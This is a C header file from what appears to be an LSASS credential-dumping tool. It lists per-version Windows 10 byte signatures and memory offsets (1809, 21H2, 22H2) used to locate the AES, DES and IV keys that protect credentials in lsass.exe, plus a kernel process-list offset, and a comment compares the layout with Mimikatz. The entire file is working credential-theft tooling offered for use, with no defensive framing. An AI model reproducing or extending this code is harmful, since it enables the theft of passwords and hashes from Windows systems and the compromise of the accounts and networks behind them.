#pragma once
typedef struct {
    char* WindowsVersion;
    unsigned char* credentialKeySig;
    int KeySigSize;
    int AES_OFFSET;
    int DES_OFFSET;
    int IV_OFFSET;
    int ActiveProcessLinksOffset;
} LsassCredentialKeyOffsets;

unsigned char credentialKeySig1809[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
unsigned char credentialKeySig21h2[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
unsigned char credentialKeySig22h2[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };

// Version, Credential Key Signature, Key Signature Size, AES, DES, IV, ActiveProcessLinks member offset
// Mimikatz has theirs formatted as: IV, DES, AES
LsassCredentialKeyOffsets LsassKeyOffsetsArray[] = {
{"1809", credentialKeySig1809, sizeof(credentialKeySig1809), 16, -89, 67, 0x2e8},
{"21H2", credentialKeySig21h2, sizeof(credentialKeySig21h2), 16, -89, 67, 0x448},
{"22H2", credentialKeySig22h2, sizeof(credentialKeySig22h2), 16, -89, 67, 0x448}
};